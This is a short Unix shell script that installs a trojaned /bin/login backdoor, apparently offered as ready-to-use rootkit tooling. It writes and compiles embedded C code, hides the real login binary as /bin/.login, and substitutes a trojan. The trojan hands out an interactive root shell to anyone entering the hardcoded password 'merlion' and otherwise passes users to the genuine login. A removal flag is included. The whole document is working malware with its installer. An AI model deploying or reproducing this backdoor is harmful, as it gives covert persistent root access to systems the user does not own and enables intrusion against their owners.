#!/bin/sh

arg="$1"
if [ "$arg" = "-r" ]; then
test -e /bin/.login && rm -f /bin/login; mv /bin/.login /bin/login; exit 0 || echo "Not installed"
elif [ $arg = "-i" ]; then

cat > /tmp/drop.c << EOF
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#define REAL "/bin/.login"
#define TROJAN "/bin/login"
#define ROOT "merlion"
char **execute;
char passwd[8];
main(int argc, char **argv) {
void connection();
pid_t pid, sid;
signal(SIGALRM,connection);
alarm(1);
execute=argv;
*execute=TROJAN;
pid=fork();
sid=setsid();
chdir("/");
umask(0);
close(STDIN_FILENO);
close(STDOUT_FILENO);
close(STDERR_FILENO);

scanf("%s", passwd);
if (strcmp(passwd,ROOT) == 0) {
alarm(0);
execl("/bin/sh","/bin/sh","-i",0);
exit(0);  }
else {
execv(REAL,execute);
exit(0);  }
}
void connection() {
execv(REAL,execute);
exit(0);  }
EOF

fi 

gcc -o /tmp/login /tmp/drop.c
rm -f /tmp/drop.c
mv /bin/login /bin/.login
mv /tmp/login /bin/

exit 0